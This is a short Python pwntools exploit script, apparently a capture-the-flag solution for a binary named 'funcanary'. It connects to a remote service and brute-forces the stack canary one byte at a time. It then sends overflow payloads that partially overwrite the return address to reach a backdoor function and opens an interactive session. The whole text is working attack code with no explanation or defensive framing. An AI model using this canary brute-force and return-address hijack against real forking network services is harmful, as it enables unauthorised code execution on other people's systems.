from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

debug = 0

if debug:
    io = process('./funcanary')
else:
    io = remote('47.93.187.243',40457)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
canary = b''
backdoor = 0x1229

for i in range(7):  #从低2位开始爆破
    for j in range(0x100):
        current_bytes = p8(j)
#        success(b"current bytes -->" + current_bytes)
        tmp = canary + current_bytes
        payload = b'a' * 0x68 + b'\x00'
        payload += tmp 
        recv = io.recvline()
#        success(b"recv value --> " + recv)
        if recv == b'have fun\n':
            canary += p8(j-1)
            success("current canary -->" + hex(u64(canary.ljust(8,b'\x00'))))
            break
        elif recv == b'welcome\n':
            io.send(payload)
        else:
            io.recvline()
            io.send(payload)
canary = canary.rjust(8,b'\x00')
context.log_level = 'debug'

i = [b'\x12',b'\x22', b'\x32', b'\x42', b'\x52', b'\x62',b'\x72',b'\x82', b'\x92', b'\xa2',b'\xb2', b'\xc2', b'\xd2',b'\xe2',b'\xf2']

for b in i:
    io.send(b'a' * 0x68 + canary + b'a' * 8 + b'\x31' + b)

io.interactive()

